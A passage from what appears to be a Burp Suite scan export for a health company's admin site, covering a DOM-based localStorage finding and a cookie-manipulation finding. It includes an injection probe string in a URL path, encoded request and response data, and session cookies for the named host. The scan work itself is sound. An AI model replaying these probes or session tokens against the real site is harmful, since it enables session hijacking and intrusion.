CAgICAgICBpZiAoJCh0aGlzKS5maW5kKCdzZWxlY3QuY2hhbmdlVmFsdWUnKS5sZW5ndGggIT09IDApIHsKICAgICAgICAgICAgICAgICQodGhpcykuYXBwZW5kKCc8ZGl2IGNsYXNzPSJjYW5jZWwiPjxpIGNsYXNzPSJmYSBmYS10aW1lcyIgc3R5bGU9ImZvbnQtc2l6ZTogMXJlbSI+PC9pPjwvZGl2PicpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJCh0aGlzKS5hcHBlbmQoJzxkaXYgY2xhc3M9ImVkaXQiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwgZmEtZncgZWRpdFJlY29yZCIgc3R5bGU9ImZvbnQtc2l6ZTogMXJlbSI+PC9pPjwvZGl2PicpOwogICAgICAgICAgICB9CiAgICAgICAgfSkub24oJ21vdXNlbGVhdmUnLCAnLnRhYmxlRWRpdGFibGUnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgJCh0aGlzKS5jaGlsZHJlbigiZGl2IikucmVtb3ZlKCk7CiAgICAgICAgfSk7CgogICAgICAgICQoJyNyZWNvcmRzIHRib2R5Jykub24oJ2NsaWNrJywgJy50YWJsZUVkaXRhYmxlIC5lZGl0JywgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIGlmICghJCgnI3JlY29yZHMnKS5oYXNDbGFzcygiZWRpdGluZyIpKSB7CiAgICAgICAgICAgICAgICAkKCcjcmVjb3JkcycpLmFkZENsYXNzKCJlZGl0aW5nIik7CiAgICAgICAgICAgICAgICB2YXIgZWxlbWVudCA9ICQodGhpcykucGFyZW50KCk7CiAgICAgICAgICAgICAgICAkKGVsZW1lbnQpLmZpbmQoJ2RpdicpLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgdmFyIGNlbGxEYXRhID0gJChlbGVtZW50KS5odG1sKCk7CiAgICAgICAgICAgICAgICB2YXIgcmVjb3JkSWQgPSAkKGNlbGxEYXRhKS5hdHRyKCJyZWNvcmRJZCIpOwogICAgICAgICAgICAgICAgdmFyIHRhZ0lkID0gIiI7CiAgICAgICAgICAgICAgICBpZiAoJChjZWxsRGF0YSkuYXR0cignaHJlZicpKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIHVybFBhcnRzID0gJChjZWxsRGF0YSkuYXR0cignaHJlZicpLnNwbGl0KCIvIik7CiAgICAgICAgICAgICAgICAgICAgdGFnSWQgPSB1cmxQYXJ0c1t1cmxQYXJ0cy5sZW5ndGgtMV07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB2YXIgdGFnTGlzdCA9IFtdOwogICAgICAgICAgICAgICAgdmFyIG9wdGlvbnMgPSAnPG9wdGlvbiB2YWx1ZT0iIj48L29wdGlvbj4nOwogICAgICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB1cmw6IEJBU0VfQURNSU4rJ1VzZXIvP2FqYXg9dHJ1ZSZpbmxpbmVFZGl0PXRydWUmdXNlcklkPScrcmVjb3JkSWQsCiAgICAgICAgICAgICAgICAgICAgZGF0YToge30sCiAgICAgICAgICAgICAgICAgICAgdHlwZTogJ3Bvc3QnLAogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBqc29uUmVzcG9uc2UgPSBKU09OLnBhcnNlKHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGpzb25SZXNwb25zZS5zdWNjZXNzID09IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBqc29uRGF0YSA9IGpzb25SZXNwb25zZS5kYXRhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFnTGlzdCA9IGpzb25EYXRhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAganNvbkRhdGEgPSBPYmplY3QuZW50cmllcyhqc29uRGF0YSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqc29uRGF0YS5zb3J0KChhLCBiKSA9PiBhWzBdLmxvY2FsZUNvbXBhcmUoYlswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAganNvbkRhdGEgPSBPYmplY3QuZnJvbUVudHJpZXMoanNvbkRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIga2V5IGluIGpzb25EYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZWN0ZWQgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoa2V5ID09IHRhZ0lkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGVjdGVkID0gJ3NlbGVjdGVkJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3B0aW9ucyArPSAnPG9wdGlvbiB2YWx1ZT0iJytrZXkrJyIgJytzZWxlY3RlZCsnPicranNvbkRhdGFba2V5XSsnPC9vcHRpb24+JzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICQoZWxlbWVudCkuaHRtbCgkKCc8c2VsZWN0IGNsYXNzPSJjaGFuZ2VWYWx1ZSB3LTEwMCIgb25jaGFuZ2U9ImNoYW5nZVVzZXJUYWcoJytyZWNvcmRJZCsnKSI+PC9zZWxlY3Q+JykuYXBwZW5kKG9wdGlvbnMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICQoZWxlbWVudCkuYXBwZW5kKGNlbGxEYXRhKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICQoZWxlbWVudCkuZmluZCgnYScpLmFkZENsYXNzKCdkLW5vbmUnKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CgogICAgICAgICQoJyNyZWNvcmRzIHRib2R5Jykub24oJ2NsaWNrJywgJy50YWJsZUVkaXRhYmxlIC5jYW5jZWwnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgdmFyIGxpbmtWYWwgPSAkKHRoaXMpLnBhcmVudCgpLmZpbmQoImEiKTsKICAgICAgICAgICAgJChsaW5rVmFsKS5yZW1vdmVDbGFzcygiZC1ub25lIik7CiAgICAgICAgICAgICQodGhpcykucGFyZW50KCkuaHRtbChsaW5rVmFsKTsKICAgICAgICAgICAgJCgnI3JlY29yZHMnKS5yZW1vdmVDbGFzcygiZWRpdGluZyIpOwogICAgICAgIH0pOwogICAgfSk7CgogICAgZnVuY3Rpb24gZmlsdGVyRGF0YShvcHRpb24sIHNldFBhZ2UpIHsKICAgICAgICBpZiAodHlwZW9mIHNldFBhZ2UgPT09ICd1bmRlZmluZWQnKSB7CiAgICAgICAgICAgIHNldFBhZ2UgPSBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCQoIiNidWxrX2FjdGlvbl9zZWN0aW9uIikuaXMoIjp2aXNpYmxlIikpIHsKICAgICAgICAgICAgJCgnI2J1bGtfYWN0aW9uX3NlY3Rpb24nKS5oaWRlKCk7CiAgICAgICAgICAgICQoJyN1cGRhdGVfYWN0aW9uJykudmFsKCcnKS50cmlnZ2VyKCJjaGFuZ2UiKTsKICAgICAgICB9CiAgICAgICAgaWYgKCQoJyNmaWx0ZXJzJykuaXMoIjpoaWRkZW4iKSAmJiAhc2V0UGFnZSkgewogICAgICAgICAgICBzaG93RmlsdGVycygpOwogICAgICAgIH0KICAgICAgICAkKCIuZGF0YVRhYmxlIikuY3NzKCJ0YWJsZS1sYXlvdXQiLCAidW5zZXQiKTsKICAgICAgICB2YXIgaW5saW5lRWRpdGluZyA9ICIiOwogICAgICAgIHZhciBiYXNlVXJsID0gImh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzIjsKICAgICAgICB2YXIgc2VhcmNoVGVybSA9ICIiOwogICAgICAgIHZhciBkaXNwbGF5U3RhcnQgPSAiIjsKICAgICAgICBpZiAob3B0aW9uID09ICJmaWx0ZXIiKSB7CiAgICAgICAgICAgIGJhc2VVcmwgKz0gIi8/YWpheD10cnVlJmZpbHRlcj10cnVlJmRyYXc9MSYiOwogICAgICAgICAgICBiYXNlVXJsICs9ICQoJCgiI2ZpbHRlckZvcm0iKVswXS5lbGVtZW50cykubm90KCIubXVsdGlwbGUiKS5zZXJpYWxpemUoKTsKICAgICAgICAgICAgJCgiLm11bHRpcGxlIikuZWFjaChmdW5jdGlvbigpewogICAgICAgICAgICAgICAgaWYgKCQodGhpcykudmFsKCkpIHsKICAgICAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICcmJyt0aGlzLmlkKyc9JyskKHRoaXMpLnZhbCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIHNlYXJjaFRlcm0gPSBkYXRhdGFibGUuc2VhcmNoKCk7CiAgICAgICAgICAgIHBhZ2VMZW5ndGggPSBkYXRhdGFibGUucGFnZS5sZW4oKTsKICAgICAgICAgICAgaWYgKHNldFBhZ2UpIHsKICAgICAgICAgICAgICAgIGRpc3BsYXlTdGFydCA9IGRhdGF0YWJsZS5wYWdlLmluZm8oKS5wYWdlKnBhZ2VMZW5ndGg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZGF0YXRhYmxlLnN0YXRlLmNsZWFyKCk7CiAgICAgICAgfSBlbHNlIGlmIChvcHRpb24gPT0gInJlc2V0IikgewogICAgICAgICAgICBiYXNlVXJsICs9ICIvP2FqYXg9dHJ1ZSI7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmaWx0ZXJGb3JtIikucmVzZXQoKTsKICAgICAgICAgICAgc2VhcmNoVGVybSA9IGRhdGF0YWJsZS5zZWFyY2goKTsKICAgICAgICAgICAgZGF0YXRhYmxlLmNvbFJlb3JkZXIucmVzZXQoKTsKICAgICAgICAgICAgZGF0YXRhYmxlLnN0YXRlLmNsZWFyKCk7CiAgICAgICAgICAgIGlmICgkKCcjZGlzcGVuc2VyX2dyb3VwX2lkJykubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAkKCcjZGlzcGVuc2VyX2dyb3VwX2lkJykudmFsKG51bGwpLnRyaWdnZXIoImNoYW5nZSIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICQoJyNmaWx0ZXJGb3JtIConKS5maWx0ZXIoJzppbnB1dCcpLmVhY2goZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBpZiAoJCh0aGlzKS5wcm9wKCd0eXBlJykgPT0gJ3RleHQnKSB7CiAgICAgICAgICAgICAgICAgICAgJCh0aGlzKS52YWwoJycpLnRyaWdnZXIoImNoYW5nZSIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkKHRoaXMpLnZhbChudWxsKS50cmlnZ2VyKCJjaGFuZ2UiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCkgewogICAgICAgICAgICAgICAgaWYgKHJldmVyc2VDb25kaXRpb25BZGRpdGlvbkZpbHRlci5pbmNsdWRlcyh0eXBlKSkgewogICAgICAgICAgICAgICAgICAgICQoJyNhcHBseUFkZGl0aW9uYWxGaWx0ZXInKS5wcm9wKCdjaGVja2VkJywgdHJ1ZSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICQoJyNhcHBseUFkZGl0aW9uYWxGaWx0ZXInKS5wcm9wKCdjaGVja2VkJywgZmFsc2UpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCkgewogICAgICAgICAgICBpZiAoISQoJyNhcHBseUFkZGl0aW9uYWxGaWx0ZXInKS5pcygiOmNoZWNrZWQiKSkgewogICAgICAgICAgICAgICAgYmFzZVVybCArPSAnJmFkZGl0aW9uYWxGaWx0ZXI9dHJ1ZSc7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICcmYWRkaXRpb25hbEZpbHRlcj1mYWxzZSc7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHVzZUNvb2tpZSkgewogICAgICAgICAgICBzZXRDb29raWUoY29va2llTmFtZSwgYmFzZVVybCwgMzApOwogICAgICAgIH0KICAgICAgICBkYXRhdGFibGUuZGVzdHJveSgpOwogICAgICAgIGRhdGF0YWJsZSA9ICQoJyNyZWNvcmRzJykuRGF0YVRhYmxlKHsKICAgICAgICAgICAgInByb2Nlc3NpbmciOiB0cnVlLAogICAgICAgICAgICAic2VydmVyU2lkZSI6IHRydWUsCiAgICAgICAgICAgICJzY3JvbGxYIjogdHJ1ZSwKICAgICAgICAgICAgIm9yZGVyIjogW1sgc29ydEluZGV4LCBzb3J0T3JkZXIgXV0sCiAgICAgICAgICAgICJhamF4IjogewogICAgICAgICAgICAgICAgInVybCI6IGJhc2VVcmwsCiAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgcmVkaXJlY3RQYWdlKEJBU0VfQURNSU4pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAiY29sdW1ucyI6IGNvbHVtblN0ciwKICAgICAgICAgICAgImJJbmZvIjogZmFsc2UsCiAgICAgICAgICAgICJzZWFyY2hpbmciOiBzZWFyY2hpbmcsCiAgICAgICAgICAgICJwYWdlTGVuZ3RoIjogcGFnZUxlbmd0aCwKICAgICAgICAgICAgImRpc3BsYXlTdGFydCI6IGRpc3BsYXlTdGFydCwKICAgICAgICAgICAgImxhbmd1YWdlIjogewogICAgICAgICAgICAgICAgInNaZXJvUmVjb3JkcyI6ICJObyByZWNvcmRzIGZvdW5kIiwKICAgICAgICAgICAgICAgICJwcm9jZXNzaW5nIjogIjxpIGNsYXNzPVwiZmEgZmEtc3Bpbm5lciBmYS1zcGluIGZhLTJ4IGZhLWZ3XCIgc3R5bGU9XCJjb2xvcjojMzQzYTQwXCI+PC9pPjxzcGFuIGNsYXNzPVwic3Itb25seVwiPkxvYWRpbmcuLm4uPC9zcGFuPiIsCiAgICAgICAgICAgICAgICAibGVuZ3RoTWVudSI6ICJJdGVtcyBwZXIgcGFnZTogX01FTlVfICIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgInNlYXJjaCI6IHsKICAgICAgICAgICAgICAgICJzZWFyY2giOiBzZWFyY2hUZXJtCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJjb2x1bW5EZWZzIjogY29sdW1uRGVmcywKICAgICAgICAgICAgInBhZ2luZ1R5cGUiOiAiaW5wdXQiLAogICAgICAgICAgICAvL2RvbTogJ2ZscnRpcCcsCiAgICAgICAgICAgIGRvbTogJzwidG9wImZpbHA+cnQ8ImJvdHRvbSJpbHA+PCJjbGVhciI+JywKICAgICAgICAgICAgZml4ZWRDb2x1bW5zOiB7CiAgICAgICAgICAgICAgICBsZWZ0OiBmaXhlZENvbHVtbk5vcwogICAgICAgICAgICB9LAogICAgICAgICAgICBidXR0b25zOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5kOiAnY3N2JywKICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ01pcmFkb3IgSW5zaWdodHMgRXZlbnQgSGlzdG9yeScsCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uOiBuZXdFeHBvcnRBY3Rpb24sCiAgICAgICAgICAgICAgICAgICAgZXhwb3J0T3B0aW9uczogewogICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5zOiBjb2x1bW5zTGlzdAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5kOiAnZXhjZWwnLAogICAgICAgICAgICAgICAgICAgIHRpdGxlOiAnTWlyYWRvciBJbnNpZ2h0cyBFdmVudCBIaXN0b3J5JywKICAgICAgICAgICAgICAgICAgICBhY3Rpb246IG5ld0V4cG9ydEFjdGlvbiwKICAgICAgICAgICAgICAgICAgICBleHBvcnRPcHRpb25zOiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbHVtbnM6IGNvbHVtbnNMaXN0CiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBjdXN0b21pemVEYXRhOiBmdW5jdGlvbiAoZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBpPTA7IGk8ZGF0YS5ib2R5Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBqPTA7IGo8ZGF0YS5ib2R5W2ldLmxlbmd0aDsgaisrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5ib2R5W2ldW2pdID0gJ1x1MjAwQycgKyBkYXRhLmJvZHlbaV1bal07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgIGluaXRDb21wbGV0ZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBkYXRhdGFibGUuYnV0dG9ucygpLmNvbnRhaW5lcigpLmFwcGVuZFRvKCQoJyNleHBvcnQnKSk7CiAgICAgICAgICAgICAgICBpZiAoaW5saW5lRWRpdGluZykgewogICAgICAgICAgICAgICAgICAgICQoJy5kYXRhVGFibGVzX3Njcm9sbEhlYWQgdGgnKS5yZW1vdmVDbGFzcygndGFibGVFZGl0YWJsZSBkLWZsZXgnKTsKICAgICAgICAgICAgICAgICAgICAkKCIuZGF0YVRhYmxlIikuY3NzKCJ0YWJsZS1sYXlvdXQiLCAiZml4ZWQiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgY29sUmVvcmRlcjogewogICAgICAgICAgICAgICAgZml4ZWRDb2x1bW5zTGVmdDogY29sUmVvcmRlckZpeGVkQ29scywKICAgICAgICAgICAgfSwKICAgICAgICAgICAgc3RhdGVTYXZlOiB0cnVlCiAgICAgICAgfSk7CiAgICAgICAgaWYgKHR5cGUgPT0gJ0Rpc3BlbnNlcicpIHsKICAgICAgICAgICAgJCgnI3JlY29yZHNfd3JhcHBlcicpLnByZXBlbmQoJzxkaXYgY2xhc3M9InJvdyBtLTAgbWItMyBjb2xvci1kYXJrLWdyZXkiPjxzdHJvbmc+IlN0cm9uZyIgZm9yIEdyZWVuLCAiV2VhayIgZm9yIFllbGxvdywgYW5kICJDcml0aWNhbCIgZm9yIFJlZDwvc3Ryb25nPjwvZGl2PicpOwogICAgICAgIH0KICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgIH0KPC9zY3JpcHQ+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPHNjcmlwdD4KICAgIHZhciBjaGFydHM9W107CiAgICBpZiAoJCgnI2FkbWluRGFzaGJvYXJkRmlsdGVycycpLmxlbmd0aCkgewogICAgICAgIGRhc2hib2FyZFJlZnJlc2hDaGFydHMoKTsKICAgIH0KICAgIGlmICgkKCcjc2FmZkRhc2hib2FyZEZpbHRlcnMnKS5sZW5ndGgpIHsKICAgICAgICBzdGFmZlVzZXJEYXNoYm9hcmRSZWZyZXNoQ2hhcnRzKCczOTknLCAnMScpOwogICAgfQogICAgPC9zY3JpcHQ+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>location.pathname</source>
      <sink>localStorage.setItem.name</sink>
      <sourceStackTrace>at Object._0x165f99 [as proxiedGetterCallback] (&lt;anonymous&gt;:1:557377)
at get pathname (&lt;anonymous&gt;:1:249642)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:147:26)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/Email:740:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/Email:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at Object.uXLIG (&lt;anonymous&gt;:1:437510)
at Object.yUDKe (&lt;anonymous&gt;:1:452444)
at _0xdc6a5f.tYxZd.quoteContext [as setItem] (&lt;anonymous&gt;:1:453117)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:146:487)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/Email:740:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/Email:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue>///Email//vp1fnucroi%27%22%60&apos;%22/vp1fnucroi/%3E%3Cvp1fnucroi//%3Eo3n14eso41&amp;</sourceValue>
      <sinkValue>DataTables_records_///Email//vp1fnucroi%27%22%60&apos;%22/vp1fnucroi/%3E%3Cvp1fnucroi//%3Eo3n14eso41&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>click</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;button class=&quot;btn btn-dark float-sm-right mr-2&quot; onclick=&quot;filterData(&apos;filter&apos;)&quot;&gt;Submit&lt;/button&gt;</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>35639471027276800</serialNumber>
    <type>5245696</type>
    <name><![CDATA[Cookie manipulation (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>Low</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based cookie manipulation arises when a  script writes controllable data into the value of a cookie. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will set an arbitrary value in the user's cookie.</p>
<p>The potential impact of the vulnerability depends on the role that the cookie plays within the application. If the cookie is used to control the behavior that results from certain user actions (for example, a 'production' versus 'demo' mode setting), then the attacker may be able to cause the user to perform unintended actions by manipulating the cookie's value. If the cookie is used to track the user's session, then the attacker may be able to perform a session fixation attack, in which they set the cookie's value to a valid token that they have obtained from the application, and then hijack the session during the victim user's subsequent interaction with the application.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based cookie manipulation vulnerabilities is not to dynamically write to cookies using data that originated from any untrusted source. This behavior should never be implemented for cookies that have any role in controlling privileged actions or user sessions within the application.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/cookie-manipulation">Web Security Academy: Cookie manipulation (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/565.html">CWE-565: Reliance on Cookies without Validation and Integrity Checking</a></li><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based cookie manipulation. Data is read from <b>input.value</b> and passed to <b>document.cookie</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9FbWFpbCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9NW5nZTI2ZHBqNTM4YmwxdmlydTZhYnZwdWc7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPURJeXZhaHVvZkp4TXhTRGl4ZTUyanJwYXVPUTR4WEVlWHZOUEpHNitTUkJHYXllZGtsQjdjVDZhQUM0Ty9oVllRV21CMS9HdTZMaDg2MFlGUW50bXNWVFdKVVlrMmN0VDFJNU9xaTBJSFJuQXkwdjJ1NUtBbWxSaW5JaFk7IEFXU0FMQkNPUlM9REl5dmFodW9mSnhNeFNEaXhlNTJqcnBhdU9RNHhYRWVYdk5QSkc2K1NSQkdheWVka2xCN2NUNmFBQzRPL2hWWVFXbUIxL0d1NkxoODYwWUZRbnRtc1ZUV0pVWWsyY3RUMUk1T3FpMElIUm5BeTB2MnU1S0FtbFJpbkloWQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>input.value</source>
      <sink>document.cookie</sink>
